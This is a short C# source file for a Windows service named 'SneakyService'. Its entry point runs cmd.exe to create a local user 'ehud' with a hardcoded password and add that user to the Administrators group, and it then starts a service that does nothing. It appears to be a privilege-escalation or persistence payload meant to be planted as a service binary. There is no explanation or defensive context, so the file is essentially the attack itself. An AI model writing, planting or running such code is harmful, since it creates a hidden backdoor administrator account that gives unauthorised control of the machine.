using System;
using System.ServiceProcess;

namespace SneakyService
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var cmd1 = "/C net user ehud l3ft-h4nd3d /add";
            System.Diagnostics.Process.Start("CMD.exe", cmd1);
            var cmd2 = "/C net localgroup administrators ehud /add";
            System.Diagnostics.Process.Start("CMD.exe", cmd2);
            ServiceBase.Run(new SneakyService());
        }
    }

    public class SneakyService : ServiceBase
    {
        public SneakyService()
        {
            this.ServiceName = "SneakyService";
            this.CanStop = true;
            this.CanPauseAndContinue = false;
            this.AutoLog = true;
        }
        protected override void OnStart(string[] args) { }
        protected override void OnStop() { }
    }
}
